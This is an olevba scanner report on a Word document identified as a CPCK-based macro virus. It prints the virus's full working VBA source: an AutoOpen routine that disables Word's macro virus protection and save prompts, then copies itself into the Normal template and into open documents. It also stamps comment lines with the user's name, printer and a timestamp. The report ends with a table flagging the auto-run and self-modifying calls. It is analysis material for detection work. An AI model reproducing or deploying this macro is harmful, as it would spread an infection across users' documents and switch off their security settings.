olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-e04017e76940c8a86a6c4fffcbcea8b6fc32dca2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-e04017e76940c8a86a6c4fffcbcea8b6fc32dca2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
On Error Resume Next
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Options.ConfirmConversions = 0
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Options.SaveNormalPrompt = 0
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Options.VirusProtection = 0
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
DH62 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
MF63 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Application.EnableCancelKey = 0
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
If DH62 > 0 And MF63 > 0 Then GoTo EJ47
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
If DH62 = 0 Then
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Set JH33 = ActiveDocument.VBProject.VBComponents.Item(1)
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
MI69 = True
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
End If
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
If MF63 = 0 Then
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Set JH33 = NormalTemplate.VBProject.VBComponents.Item(1)
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
MT67 = True
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
End If
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
If MT67 <> True And MI69 <> True Then GoTo EJ47
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
If MT67 = True Then JH33.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DH62 - 1))
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
If MI69 = True Then JH33.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MF63 - 1))
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
With JH33.CodeModule
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
For x = 2 To (JH33.CodeModule.CountOfLines - 1) Step 2
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
Next x
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
End With
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
EJ47:
'Andreas MarxAMDokument1Dokument1HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:54
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

